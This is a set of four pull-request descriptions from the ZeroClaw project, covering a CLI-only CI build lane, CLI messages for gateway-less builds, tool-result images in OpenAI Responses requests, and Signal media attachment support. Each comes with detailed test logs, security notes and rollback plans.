prs.title: ci(cli-only): build and test the CLI-only feature set with an artifact ratchet
prs.body:
## Summary

- **Base branch:** `feat/cli-only-standard-build-hint`, stacked on #11975. This branch also contains #11269 (the gateway feature edges) and #11973 (the agent cascade), which the CLI-only set needs. The current diff is against the #11975 branch; land the parent and retarget to `master` before merging this child.
- **What changed and why:**
  - **The selection.** `cargo generate features --selection cli-only` resolves the standard distribution without the dashboard, the web gateway and the ACP bridge that dials it.
    - The left-out features are one registry list, `cli_excluded_features` in the root `Cargo.toml`, next to `container_excluded_features`. Release workflows, installers and docs all read that one source.
    - Installer menus do not offer the selection.
  - **The CI lane.** A new required lane, `test-cli-only`, runs on that set:
    - clippy with `-D warnings`;
    - the root crate's library, binary, component, integration, system and architecture tests.

    The set enables `plugins-wasm`, which `test`'s default features leave out, so the lane also installs the `wasm32-wasip2` target that the plugin tests build their fixture for.
  - **The ratchet.** `scripts/ci/cli_only_ratchet.sh` fails in any of these cases:
    - the build links `zeroclaw-gateway` or `include_dir`;
    - `axum` has a direct dependent other than `zeroclaw-channels` (a crate-level exception; the check does not distinguish individual channel listeners);
    - the binary contains `zeroclaw_gateway` symbols.

    It has its own fixture test, which `repo-structure` runs.
  - **Bookkeeping.** `tests/architecture/ci_runner_labels.rs` lists the new compile job, and `docs/book/src/maintainers/ci-and-actions.md` describes it.
- **Scope boundary:** no release artifact or installer change, and no change to the standard build. Installing and updating the CLI-only build is a follow-up PR that merges after the v0.8.7 tag.
- **Blast radius:** CI only. Every PR gets one more compile-heavy job; it shares nothing with `test`'s cache key. Its runtime is in this PR's first CI run.
- **Linked issue(s):** Part of #11971. Depends on #11269, #11973 and #11975.

### What this does, simply

The CLI-only build stays CLI-only only if something checks it. This adds that check to CI: every PR builds the CLI-only set, runs its tests, and fails if the web gateway or the dashboard files come back.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The new `Test (CLI-only build)` job on this PR is the check itself.

### How I tested

Tested on `da6c2d3ee9` (on master 89bd18484b). The head, `84d018eabc`, adds only the lane's `wasm32-wasip2` target install; my toolchain already had that target. `$LIST` is the resolved CLI-only set. Test binaries were built first, then run in a network namespace with loopback only.

```text
cargo fmt --all -- --check                                                → exit 0
cargo test --locked -p xtask -- spec                                      → 30 passed, 0 failed (incl. cli_only_is_dist_without_the_cli_excluded_features,
                                                                             cli_only_is_named_but_not_offered_in_installer_menus)
cargo run --quiet --locked -p xtask --bin generate -- features --selection cli-only --target x86_64-unknown-linux-gnu
  → agent-runtime,channel-acp-server,channel-discord,channel-email,channel-filesystem,channel-git,channel-lark,
     channel-matrix,channel-telegram,channel-webhook,observability-prometheus,plugins-wasm-cranelift,schema-export,
     tool-claude-code,tool-claude-code-runner,tool-codex-cli,tool-composio,tool-gemini-cli,tool-google-workspace,
     tool-jira,tool-linkedin,tool-microsoft365,tool-notion,tool-opencode-cli,tool-project-intel,tools-external,whatsapp-web
     (27 features: the 29-feature dist set without `gateway` and `acp-bridge`; dist has no `embedded-web`)
cargo generate installers --check                                         → exit 0 (no generated file changes)
bash scripts/ci/cli_only_ratchet.test.sh                                  → cli_only_ratchet tests passed.
# the lane
cargo clippy --locked -p zeroclaw --all-targets --no-default-features --features "$LIST" -- -D warnings
                                                                          → exit 0
cargo nextest run --locked --no-fail-fast -p zeroclaw --no-default-features --features "$LIST" \
  --lib --bins --test component --test integration --test system --test architecture
                                                                          → 1644 run: 1643 passed, 1 failed (the `expect` test), 2 skipped
cargo build --locked -p zeroclaw --bin zeroclaw --no-default-features --features "$LIST" → exit 0
bash scripts/ci/cli_only_ratchet.sh run x86_64-unknown-linux-gnu target/debug/zeroclaw → CLI-only ratchet passed.
cargo tree -p zeroclaw --no-default-features --features "$LIST" -e normal,build -i zeroclaw-gateway → warning: nothing to print.
```

- **The one failing test** is `daemon_feedback_follows_foreground_job_control_transitions`. It needs `expect`, which my machine does not have. The lane installs `expect`, as `test` does.
- **The plugin tests need `wasm32-wasip2`.** All 21 `plugin_update_cli` tests pass here. The first CI run, on `da6c2d3ee9` without the target, failed 6 of them ("can't find crate for `core`") and stopped; `84d018eabc` installs it.
- **The new tests in the lane pass by name:** both `cli_only_build` tests, `gateway_check_reports_the_gateway_as_not_in_this_build`, and #11973's three agent delete tests.

**Ratchet sensitivity:**

| Change | Result |
|---|---|
| `gateway` removed from `cli_excluded_features` | `cli_only_ratchet.sh run` fails: `::error::the CLI-only build links zeroclaw-gateway` |
| The standard (dist) binary passed to `run` | fails: `::error::the CLI-only binary contains zeroclaw_gateway symbols` |
| `include_dir` removed from the script's forbidden list | the fixture test fails ("expected the ratchet to fail: dashboard assets are embedded") |

The fixture test also drives `run` mode with stub `cargo` and `nm`. It checks that a passing run exits 0 and that a run that links the gateway fails.

**The standard build is unchanged.** Comparing master with this stack, `cargo tree -e normal,build -f '{p} {f}'` (packages with their enabled features) is identical for:
- the default set;
- the dist set;
- dist plus `embedded-web` (Linux and aarch64-apple-darwin).

`generate features --selection dist` is identical for six release targets.

The standard build still serves the dashboard. Each binary ran from an empty directory, inside the namespace:

| Build | `GET /` | Entry script |
|---|---|---|
| Linux archive layout: the dist binary with `web/dist` next to it | 200, `text/html`, 2234 bytes, with `<div id="root">` and a module script | 200, `text/javascript`, 369307 bytes, byte-identical to the built file |
| The desktop kernel's set (dist plus `embedded-web`), with no `web/dist` on disk | 200, `text/html`, 2234 bytes, with `<div id="root">` and a module script | 200, `text/javascript`, 369307 bytes, byte-identical to the built file |
| Control: the dist binary with no `web/dist` | 503, `text/plain`; at startup it prints `Web Dashboard: not available — reinstall with the supported installer …` | — |

- **CI checks relied on and why they cover this change:** the new `Test (CLI-only build)` job, and `repo-structure` for the ratchet fixture test.
- **Known CI coverage gap, if any:** None after the lane runs.
- **Commands run and tail output:** above.
- **Beyond CI, what did you manually verify?** The ratchet sensitivity above.
- **Visual interface evidence:** N/A (CI only)
- **Tested revision, interface, and evidence path:** `da6c2d3ee9` (the head `84d018eabc` adds only the target install); CI scripts, `cargo tree`, and the dashboard over HTTP on a loopback port.
- **Screenshot or exact-output evidence:** N/A
- **Action or changed state and observed result:** N/A
- **If any command was intentionally skipped, why:** the `expect` test, as above.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No. The lane installs nextest the same way `test` does.
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No
- If any `Yes`, describe the risk and mitigation: N/A

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? No. It adds an xtask selection id.
- Rust/MSRV/toolchain floor changed? No
- If backward compatibility is `No` or either surface/floor question is `Yes`: exact upgrade steps for existing users: N/A

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert <sha>`. To unblock merges quickly, remove `test-cli-only` from the `gate` job's `needs`.
- **Feature flags or config toggles:** None
- **Observable failure symptoms:** either of these:
  - `Test (CLI-only build)` failing on unrelated PRs (a flake in the gateway-less configuration);
  - `CI Required Gate` waiting on it.

prs.title: feat(cli): point builds without the gateway to the standard build
prs.body:
## Summary

- **Base branch:** `master`, stacked on #11974. This PR adds one commit on top of it.
- **What changed and why:**
  - A build without the gateway feature (the CLI-only build) has no dashboard.
    - `zeroclaw gateway`, its subcommands and `zeroclaw desktop` now print one line naming the command that installs the standard build, and exit non-zero.
    - Before, `gateway` and `gateway start` said "Rebuild with --features gateway".
    - Before, `gateway get-paircode` printed a failure about a missing admin token and exited 0.
    - Before, `gateway restart` first asked any gateway already running on the configured address to shut down (`POST /admin/shutdown`), and only then failed, because it could not start one.
  - `zeroclaw status` shows "Web UI: not included in this build (CLI-only)" instead of printing nothing.
  - `zeroclaw self-test --full` reports the gateway check as not included, instead of failing it.
  - Two English Fluent keys are added: `cli-no-dashboard-in-build` and `cli-status-web-ui-not-in-build`. Other locales fall back to English until translated.
  - New component tests (`tests/component/cli_only_build.rs`) run only in builds without the gateway. `desktop_cli_linux` now requires the gateway, since `zeroclaw desktop` installs a companion that talks to it.
- **Scope boundary:**
  - Builds with the gateway are unchanged: the new branches compile there but are never taken.
  - The daemon is not changed. Its ready banner already omits the gateway line when no gateway runs.
  - No new remote-access path. A CLI-only server is reached through zerocode over SSH, or with OIDC.
- **Blast radius:** `src/main.rs` (the gateway and desktop arms, and status), `src/commands/self_test.rs`, `crates/zeroclaw-runtime/locales/en/cli.ftl` and `tests/component/`.
- **Linked issue(s):** Part of #11971. Depends on #11974.

### What this does, simply

ZeroClaw is getting a build for servers that leaves out the dashboard. In that build, asking for the dashboard used to give a confusing error, and `gateway restart` could stop a different ZeroClaw's gateway on the same machine. Now each of these commands says plainly that this build has no dashboard, and how to install the version that does.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes. It needs a build without the gateway.
- **Interface(s) exercised:** `cli`
- **Setup / preconditions:** `cargo build -p zeroclaw --bin zeroclaw --no-default-features --features agent-runtime,default-channels,observability-prometheus,schema-export`
- **Steps to run:** `zeroclaw gateway start; echo $?`, then `zeroclaw status`
- **Expected on this branch (after):** the one-line "This ZeroClaw build has no dashboard or web gateway (CLI-only build). To use them, install the standard build: …" and exit 1. `status` shows `🌐 Web UI: not included in this build (CLI-only)`.
- **Prior behavior on `master` (before):** `Gateway feature is not enabled. Rebuild with --features gateway`, and `status` prints no Web UI line.

### How I tested

Tested on `e36734ae8e` (on master 89bd18484b), with `<set>` = `agent-runtime,default-channels,observability-prometheus,schema-export`. Test binaries were built first, then run in a network namespace with loopback only, so nothing could reach a gateway on the machine.

```text
cargo fmt --all -- --check                                                 → exit 0
cargo clippy --locked -p zeroclaw --all-targets -- -D warnings             → exit 0
cargo nextest run --locked --no-fail-fast -p zeroclaw --no-default-features --features <set> \
  --lib --bins --test component --test integration --test system --test architecture
                                                                           → 1299 run: 1298 passed, 1 failed (the `expect` test), 2 skipped
  (incl. cli_only_build::gateway_and_desktop_commands_point_to_the_standard_build,
   cli_only_build::status_says_the_dashboard_is_not_in_this_build,
   self_test::…::gateway_check_reports_the_gateway_as_not_in_this_build)
cargo nextest run --locked --no-fail-fast -p zeroclaw --test component --test architecture
                                                                           → 342 run: 341 passed, 1 failed (the `expect` test); standard build
```

The one failure in each run is `daemon_feedback_follows_foreground_job_control_transitions`, which needs `expect`. My machine does not have it; CI installs it.

**Exact output** from the full CLI-only build (#11976's set), `LC_ALL=C`, with a fresh config. `zeroclaw gateway start`, `gateway get-paircode`, `gateway` and `desktop` each exit 1 with:

```text
Error: This ZeroClaw build has no dashboard or web gateway (CLI-only build). To use them, install the standard build: curl -fsSL https://raw.githubusercontent.com/zeroclaw-labs/zeroclaw/master/install.sh | sh
```

and `zeroclaw status` shows:

```text
🌐 Web UI:        not included in this build (CLI-only)
```

**Revert check.** With the guard removed from the `gateway` arm, `gateway_and_desktop_commands_point_to_the_standard_build` fails (0 passed, 1 failed): `["gateway", "get-paircode"] must fail in a build without the gateway`. Restoring the guard makes it pass (1 passed).

- **CI checks relied on and why they cover this change:** `CI Required Gate` covers the standard build and the Fluent coverage of the two new keys (`architecture`). The CLI-only lane in #11976 runs `cli_only_build` and the self-test change.
- **Known CI coverage gap, if any:** until #11976 lands, CI does not build the gateway-less configuration. The commands above cover it.
- **Commands run and tail output:** above.
- **Beyond CI, what did you manually verify?** The exact output above. Not verified: other locales (they fall back to English).
- **Visual interface evidence:** Exact plain-text output (noninteractive, unstyled CLI output), above.
- **Tested revision, interface, and evidence path:** `e36734ae8e` for the tests, `da6c2d3ee9` (#11976, the CLI-only set) for the output; `cli`; `LC_ALL=C`, `TERM=dumb`.
- **Screenshot or exact-output evidence:** above.
- **Action or changed state and observed result:** each command above exits 1 with the line shown.
- **If any command was intentionally skipped, why:** the `expect` test, as above.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No. A gateway-less `gateway restart` no longer sends `POST /admin/shutdown` to the configured address.
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No
- If any `Yes`, describe the risk and mitigation: N/A

## Compatibility (required)

- Backward compatible? Yes. Only builds without the gateway change.
- Config / env / CLI surface changed? Yes, in gateway-less builds only:
  - two new messages;
  - `gateway get-paircode` now exits non-zero where it used to print a failure and exit 0;
  - `gateway restart` refuses before contacting anything.
- Rust/MSRV/toolchain floor changed? No
- If backward compatibility is `No` or either surface/floor question is `Yes`: exact upgrade steps for existing users: none. Standard builds are unchanged.

## Rollback (required for medium/high-risk PRs)

Low risk: `git revert <sha>`.

prs.title: fix(openai): preserve tool-result images in Responses requests
prs.body:
## Summary

- **Base branch:** `master`.
- **What changed and why:**
  - Preserve declared tool-result images in the shared Responses request builder. Image-bearing outputs use `input_text` and `input_image` items with the original call ID and image order.
  - Retain string outputs for text-only and legacy results. Marker-looking tool text remains literal text; attachments come from the existing carrier parser.
  - Add serialization regressions, captured HTTP-request tests for both adapters and streaming modes, and an explicitly ignored live agent/tool test with randomized synthetic images.
- **Scope boundary:** OpenAI Responses only. No Chat Completions, other-provider, Matrix-caption, public-type, dependency, production-configuration, or persistence changes.
- **Blast radius:** Codex/OAuth and API-key OpenAI Responses share this builder. API-key Responses requires the existing alias-level `vision = true` override for images to survive runtime capability routing; capability defaults are unchanged. Existing image normalization, limits, omission notes, and turn lifetime remain authoritative.
- **Linked issue(s):** Closes #12104. Related #9599; that tracker covers additional providers.
https://github.com/zeroclaw-labs/zeroclaw/issues/12104
https://github.com/zeroclaw-labs/zeroclaw/issues/9599

### What this does, simply

An image-producing tool could return both a caption and an image, but these adapters sent only the caption to the model. This change includes the declared image in the tool response using OpenAI's structured function-output format. Ordinary text results keep their existing format. A backend that rejects structured image outputs still returns an error; there is no silent text-only retry.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A for a manual UI walkthrough: this change is at the request-serialization boundary. The regression and local HTTP mocks directly observe that boundary. An opt-in live agent/tool test is also included, with the access limitation below.

### How I tested

- **CI checks relied on and why they cover this change:** Hosted Rust checks will provide broader workspace/platform coverage after publication. No pending CI is counted as passing evidence here.
- **Known CI coverage gap, if any:** The live OAuth test is intentionally ignored and requires an explicitly supplied auth file and access to `gpt-5.3-codex`.
- **Commands run and tail output:** All final local runs used `f1100e30631eac5032d47b11b522f6c6260c5520`, a disposable `CARGO_TARGET_DIR`, `CARGO_PROFILE_DEV_DEBUG=0`, and `CARGO_PROFILE_DEV_INCREMENTAL=false`.

```text
cargo test --locked -p zeroclaw-providers -- --test-threads=1
test result: ok. 1985 passed; 0 failed; 4 ignored; 0 measured; 0 filtered out; finished in 67.03s
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s
test result: ok. 60 passed; 0 failed; 3 ignored; 0 measured; 0 filtered out; finished in 10.38s
test result: ok. 0 passed; 0 failed; 1 ignored; 0 measured; 0 filtered out; finished in 0.00s

cargo +1.98.1 clippy --locked -p zeroclaw-providers --all-targets -- -D warnings
Finished `dev` profile [unoptimized] target(s) in 44.84s

cargo fmt --all -- --check
# exit 0
bash scripts/ci/comment_hygiene_gate.test.sh
58 passed, 0 failed
bash scripts/ci/comment_hygiene_gate.sh
Comment hygiene gate passed.

cargo test --locked --test live --no-run
Finished `test` profile [unoptimized] target(s) in 1m 58s
```

The initial concurrent provider run failed three existing proxy-sensitive tests: model-listing auth failure, native tool-round wire flags, and runtime proxy configuration. Requests received another test's proxy response and the proxy hit count was inflated. The same complete suite passed serially, without changing those tests or suppressing failures.

Default local Rust 1.99 Clippy reported `needless_borrows_for_generic_args` at the unchanged `crates/zeroclaw-providers/src/lib.rs:1121` and `:1125`. The strict run above uses installed Rust 1.98.1, matching CI's 1.98 compiler series (CI pins 1.98.0). The live-test build also emitted a deprecation warning for unchanged `rpc/upload.rs:90` and a macOS linker warning about the binary's large unwind table; compilation succeeded.

The regression was first run against production code unchanged from upstream `5a28cda06e55af575fcb3c900340f140be465ebb`; it failed because `output` was a string instead of text/image content items. It passes with this change. Tests cover image-only results, verbatim captions, multiple images, ordinary text, malformed/legacy carriers, quoted markers, local-file normalization, same-turn reuse, next-turn expiry, omission notes, and visible backend rejection.

- **Beyond CI, what did you manually verify?** Ran the compiled ignored live test `live::openai_responses_tool_images::agent_reads_randomized_tool_images` with `--ignored --exact --nocapture --test-threads=1` and an explicitly supplied `ZEROCLAW_TEST_CODEX_AUTH_FILE`. It imports OAuth into temporary state and uses the real agent/tool loop with fallback disabled. The backend rejected the first request; no synthetic tool invocation occurred and pixel interpretation remains unverified.
- **Visual interface evidence:** N/A; no presentation or interaction surface changed.
- **Tested revision, interface, and evidence path:** `f1100e3063`; provider HTTP mocks and the agent test harness in `tests/live/openai_responses_tool_images.rs`. No attributed application UI or messaging-channel UI was exercised.
- **Screenshot or exact-output evidence:** Live attempt, with credentials and account identifiers omitted:

```text
provider=openai-codex model=gpt-5.3-codex fallback=disabled
400 Bad Request; code=model_not_found
The 'gpt-5.3-codex' model is not supported when using Codex with a ChatGPT account.
test result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 7 filtered out; finished in 0.92s
```

- **Action or changed state and observed result:** Tool carriers now produce ordered image content in captured requests from both Responses adapters, with and without streaming. A later user turn removes old tool images; a 400 response remains visible after one request.
- **If any command was intentionally skipped, why:** Full workspace checks are left to hosted CI. No live API-key Responses call was made, and the selected live OAuth model was unavailable. The ignored test can be rerun with `cargo test --locked --test live live::openai_responses_tool_images::agent_reads_randomized_tool_images -- --ignored --exact --nocapture` after explicitly setting its auth-file environment variable.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No.
- New external network calls? Yes, in the opt-in live test only. It makes live model calls only when explicitly run; production uses the existing Responses destination and request round.
- Secrets / tokens / credentials handling changed? Yes, in the test only. It imports an explicitly supplied auth file into disposable temporary state using the existing importer; production handling is unchanged, and no credentials or account identifiers are printed.
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No; all image fixtures are synthetic.
- Prompt injection or untrusted model-visible text introduced/changed? Yes: declared image pixels now reach the model. Existing attachment declaration, normalization, limits, and expiry apply; body text is never promoted into an attachment.

## Compatibility (required)

- Backward compatible? Yes for supported OpenAI Responses: text-only outputs remain strings; image-bearing outputs use the documented structured form. Custom backends that reject this form surface their error.
- Config / env / CLI surface changed? No production surface change. The ignored test adds the explicit opt-in `ZEROCLAW_TEST_CODEX_AUTH_FILE` test input.
- Rust/MSRV/toolchain floor changed? No.
- Exact upgrade steps for existing users: None. The live test requires an explicitly chosen auth file and access to its selected model; it never auto-discovers credentials.

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert f1100e30631eac5032d47b11b522f6c6260c5520`.
- **Feature flags or config toggles:** None.
- **Observable failure symptoms:** A custom Responses endpoint may reject image-bearing `function_call_output` arrays with a visible provider/API error. Reverting restores the prior text-only behavior, including the original image loss.

prs.title: feat(channels/signal): add media attachment support
prs.body:
## Summary

- **Base branch:** `master` (all contributions)
- **What changed and why:**
  - Inbound: Signal attachments are fetched from signal-cli (`getAttachment`), saved under the owning agent's workspace in `signal_files/`, and rendered as `[IMAGE|AUDIO|VIDEO|DOCUMENT:<path>]` markers with `MediaAttachment.marker` set, so the shared media pipeline treats Signal like the other media-capable channels instead of seeing `attachments: vec![]`.
  - Attachment-only messages now reach the agent when `ignore_attachments = false`; previously they produced no message.
  - Outbound: media markers in replies are resolved into signal-cli attachments (RFC 2397 data URIs, so delivery works when signal-cli does not share ZeroClaw's filesystem). Only regular files inside the workspace are accepted; URLs, other schemes, and paths that resolve outside the workspace are refused.
  - Unresolved markers are removed from the reply, logged with a reason (never the path), and summarized in a count-only Fluent notice.
  - signal-cli echoes a rejected attachment argument in its error text, which for a data URI is the whole file; `rpc_request` now redacts data URIs from signal-cli errors before they can reach logs.
  - Signal gets a `channel_delivery_instructions` block (same shape as WhatsApp Web's) so the model is told the marker syntax and the workspace/no-URL rules. Without it, the model has no way to know Signal accepts attachments and sends paths as plain text.
- **Scope boundary:** No changes to Signal auth/account lifecycle, SSE reconnect, typing indicators, health checks, other channels, shared helpers (`util.rs`, `zeroclaw-api` media types, media pipeline), or config schema. `[LOCATION:…]` markers stay text. Outbound URL fetching is intentionally not supported.
- **Blast radius:** Signal channel only: `signal.rs`, Signal construction sites and the Signal delivery-instructions block in `orchestrator/mod.rs`, the `channel-signal` feature (now enables the existing optional `mime_guess` dependency), two Fluent keys in each runtime locale, and the Signal docs page. `rpc_request` now moves params/results instead of cloning them and redacts data URIs from signal-cli error text (all Signal RPC calls go through it; wire format unchanged).
- **Linked issue(s):** Closes #7891. Related #11013 (RFC #9488 implementation tracker), Related #9488, Related #5832 (earlier, unreviewed attempt closed by its author; see notes below).

### What this does, simply

Signal could only exchange text with the agent. Photos, voice notes, and files sent to the bot were silently dropped, and when the agent tried to send a file back, the literal `[IMAGE:/path]` tag showed up in the chat. With this change, files people send over Signal are saved into the agent's workspace and the agent can see them (images go to vision-capable models), and the agent can send files from its workspace back as real Signal attachments. Files outside the workspace, and links, are never sent; if the agent asks for one, it is dropped and the message gets a short "(note: I couldn't deliver N file.)" line instead of exposing the path. Text-only behavior and `ignore_attachments = true` are unchanged.

### Interim scope and RFC #9488 migration

This is the narrow interim implementation agreed on #7891: it uses today's channel media contract (`MediaAttachment`, `RenderedMarker`, `MarkerKind`, the `[KIND:path]` marker rendering, and provider-loadability classification) and keeps all Signal-specific work in the Signal adapter and its orchestrator wiring. No shared contract, no-new-marker check, `FileId`, or `ContentPart::File` exists on `master` at this head; if one lands first, this PR adapts to it rather than adding an exception.

Signal paths that RFC #9488 Phase 4 will migrate (tracked by #11013):

| Path | Today | Phase 4 |
|---|---|---|
| Inbound marker writer: `SignalChannel::attach_inbound_media`, `fetch_inbound_attachment`, `inbound_marker_kind`, `marker_label` (`signal.rs`) | Renders `[IMAGE\|AUDIO\|VIDEO\|DOCUMENT:<path>]` into `ChannelMessage.content` and sets `MediaAttachment.marker` | Emit a `ContentPart::File { file_id }` through the shared intake instead of a marker |
| Inbound storage: `save_inbound_attachment`, `SIGNAL_ATTACHMENT_SAVE_SUBDIR` | `<agent workspace>/signal_files/<uuid>_<basename>` | Managed file intake; existing `signal_files/` contents are legacy channel media (the RFC excludes automatic deletion) |
| Outbound marker reader: `prepare_outbound`, `resolve_outbound_marker`, `SIGNAL_OUTBOUND_MARKER_KINDS` (`signal.rs`) | Parses markers with the shared `util::parse_attachment_markers_of_kinds`, confines targets to the workspace, sends RFC 2397 data URIs | Runtime resolves and authorizes a `FileId`; the adapter only streams the resolved bytes |
| Model guidance: `"signal"` arm of `channel_delivery_instructions` (`orchestrator/mod.rs`) | Teaches the marker syntax and workspace/no-URL rules | Removed or replaced with `FileId` delivery guidance |
| Failure notice: `channel-signal-delivery-failure-note-{one,many}` | Count-only note for dropped markers | Replaced by the runtime's delivery outcome reporting |

Expected to carry over unchanged: the `getAttachment` download (after the sender checks), the `size`/decoded-length caps, and the signal-cli `send` `attachments` parameter with data URIs.

### Sending a received file back

An inbound attachment is saved at an absolute path inside the agent's workspace (`<workspace>/signal_files/<uuid>_<name>`), which is exactly what the outbound resolver accepts, so the agent can send it back by copying the inbound marker into its reply (`[DOCUMENT:/…/signal_files/<uuid>_report.pdf]`); `inbound_saved_attachment_can_be_sent_back_with_its_marker` covers this. The shared provider preparation keeps `[DOCUMENT:]`, `[FILE:]`, `[VIDEO:]`, and `[PHOTO:]` paths model-visible for exactly this delivery case. Two shared behaviors outside this PR apply: an `[IMAGE:]` marker is consumed by vision preparation, and `[AUDIO:]`/`[VOICE:]` markers are replaced by a placeholder (the audio is transcribed), so for those kinds the path is not in the model-visible text of that turn; the file remains in `signal_files/`.

### Known behavior outside this PR

- **Forwards arrive as two messages.** Signal sends a forwarded file and its added comment separately, so each becomes its own turn unless `[channels] debounce_ms` merges them. The debouncer measures arrival time, and the file arrives only after signal-cli downloads it, so large files can need a longer window. Tracked in #11553.
- **Earlier images are re-sent on later turns.** Signal image markers are file paths, which history keeps (as for Telegram and Discord), and with the default `[multimodal] max_image_turns = 0` they are reloaded on every turn; the model can then describe images that were never sent. Tracked in #11554.
- **Full-resolution 12 MP photos are dropped.** A 4000×3000 JPEG exceeds the 64 MiB per-image decode ceiling and is skipped with a "could not be loaded" note; see #9887.

Notes:
- Prior art: #5832 (closed by its author before review) sketched the same feature. No code was carried over; this implementation follows the current channel media contract (`RenderedMarker`, provider-loadability classification, per-agent workspaces, workspace confinement), so there is no `Co-authored-by` trailer.
- Source of truth for the workspace: `Config::channel_workspace_dir("signal.<alias>")` (owning agent's workspace), resolved when the channel is built, the same way Telegram, Slack, Discord, Matrix, and WhatsApp receive it. Per the channel runtime lifecycle, listeners adopt agent-binding changes on daemon reload.
- Docs: English source only; `.po` translation-cache churn is left for a dedicated translation pass.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Yes
- **Interface(s) exercised:** `channel` = `signal`
- **Setup / preconditions:** A dedicated test Signal account linked in a `signal-cli` HTTP daemon; a `[channels.signal.<alias>]` entry bound to an agent via the agent's `channels` list; a vision-capable model if you want to check image understanding.
- **Steps to run:**
  1. From another Signal account, send the bot a photo with a caption, then a photo with no caption, then a PDF.
  2. Ask the agent to send back a file from its workspace (for example, have it write `report.txt` and reply with `[DOCUMENT:report.txt]`).
  3. Ask it to send `[IMAGE:https://example.com/a.png]` or a path outside its workspace.
- **Expected on this branch (after):** (1) The agent receives each file; it is saved in `<agent workspace>/signal_files/` and the agent can describe the image. The caption-less photo still reaches the agent. (2) The file arrives as a Signal attachment without the marker text. (3) Nothing is attached, the marker is gone, and the reply ends with the count-only note; logs show `signal: dropping unresolved outbound attachment marker` with `reason` `scheme` or `outside_workspace`.
- **Prior behavior on `master` (before):** (1) The agent sees only the caption; caption-less photos produce no message. (2) and (3) The literal `[DOCUMENT:report.txt]` / `[IMAGE:…]` text is sent to the chat.

### How I tested

- **CI checks relied on and why they cover this change:** Required CI passes on `b9022fc7`. Lint checks the feature-enabled code through workspace clippy with `ci-all`; the default-feature workspace Test job covers shared code and the Signal delivery-instructions test, but does not enable `channel-signal` or run its `signal::` unit tests. The 87 focused Signal and delivery-instructions tests below are local validation reported by the author, not hosted Test-job coverage.
- **Known CI coverage gap, if any:** No automated system test drives a Signal envelope through runtime dispatch to an outbound reply; the new tests exercise the adapter against a mocked signal-cli JSON-RPC endpoint. Vendor-side behavior (real `getAttachment` payloads, data-URI acceptance, Signal's post-encryption size limit) is covered only by the manual run below.
- **Commands run and tail output:** (Rust 1.98.0 in a podman build container; Rust checks ran on this commit's code before two docs-only amends; markdownlint was re-run on the final docs page)
  ```text
  (Updated for b9022fc7, the review fix: fmt, channel clippy, and the Signal tests below were re-run on it; the workspace clippy, rustdoc, hygiene, and ci build lines are from f8b0bffb, with CI covering b9022fc7)

  $ cargo fmt --all -- --check
  (no output, exit 0)

  $ bash scripts/ci/run_clippy.sh --scope workspace ...   # cargo clippy --locked --workspace --exclude zeroclaw-desktop --all-targets --features ci-all -- -D warnings
      Finished `dev` profile [unoptimized + debuginfo] target(s) in 1m 56s   (exit 0, no warnings; CARGO_BUILD_JOBS=1)

  $ cargo clippy -p zeroclaw-channels --all-targets --features channel-signal --locked -- -D warnings
  (exit 0, no warnings)

  $ cargo test -p zeroclaw-channels --features channel-signal --locked --lib -- signal:: channel_delivery_instructions
  test result: ok. 87 passed; 0 failed; 0 ignored; 0 measured; 1966 filtered out

  $ cargo doc --no-deps --workspace --exclude zeroclaw-desktop
      Finished `dev` profile [unoptimized + debuginfo] target(s) in 3m 36s   (no warnings)

  $ bash scripts/ci/comment_hygiene_gate.sh
  Comment hygiene gate passed.

  $ cargo fluent check && cargo fluent scan
  (both exit 0; scan reports no Signal keys)

  $ cargo check --locked --features channel-signal
      Finished `dev` profile ... (no warnings)

  $ cargo build --locked --profile ci -p zeroclaw --features ci-all
      Finished `ci` profile [optimized] target(s) in 10m 41s   (no warnings)

  $ npx markdownlint-cli2 docs/book/src/channels/signal.md
  1 issue: MD001 at the existing `#### sh` tab heading in "Start and check" (present on master; not in changed lines)
  ```
  New unit tests (26): outbound data-URI attachment for direct and group recipients, count-only note with no target leakage, note-only reply when every marker fails, verbatim text when no markers (including `[LOCATION:…]`), refusal of URLs/`data:`/`file:`, missing workspace, absolute and `..` escapes, symlink escape, `not_found`/`not_a_file`/`too_large` failures; inbound image save with `RenderedMarker::Image`, attachment-only group document with traversal-style filename, `ignore_attachments` (no download), no workspace (bytes only), download failure (text kept, empty message dropped), oversized `size` skipped without download, DM `recipient` vs group `groupId` download params; Fluent note keys present and count-only; the Signal delivery-instructions block describes the marker contract, offers no `[LOCATION:]`, and reaches the channel system prompt; an inbound saved document sent back by copying its marker arrives as the same bytes; a signal-cli error that echoes a data URI is redacted (`data:<redacted>`) and ordinary text such as `metadata:` is left alone; and, from the review fix: an inbound batch stops calling `getAttachment` once the per-message budget is spent (including an attachment with no declared size), a declared size past the remaining budget skips the download, an oversized `getAttachment` response is refused even when the payload itself would fit, an outbound batch over budget sends what fits and counts the rest, saved-name sanitizing, and a `report]v2.pdf` attachment round-trips through its marker. Removing each of the four fixes makes its test fail.
